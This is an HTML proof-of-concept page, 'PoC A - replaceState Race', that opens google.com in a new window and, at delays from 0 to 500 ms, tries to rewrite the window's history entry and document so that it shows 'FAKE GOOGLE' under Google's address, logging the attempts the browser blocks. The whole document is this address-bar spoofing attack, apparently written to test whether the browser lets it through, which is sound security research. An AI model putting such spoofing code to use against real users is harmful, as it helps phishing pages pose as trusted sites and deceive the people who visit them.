<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC A - replaceState Race</title>
</head>
<body>

<h2>replaceState Race</h2>
<button onclick="run()">Run</button>

<script>
const TARGET = "https://www.google.com";

function run() {
  const w = window.open(TARGET);

  [0,10,50,100,200,500].forEach(delay => {
    setTimeout(() => {
      try {
        w.history.replaceState({}, "", TARGET);
        w.document.open();
        w.document.write("<h1>FAKE GOOGLE</h1>");
        w.document.close();
      } catch(e) {
        console.log("Blocked:", delay, e.message);
      }
    }, delay);
  });
}
</script>

</body>
</html>
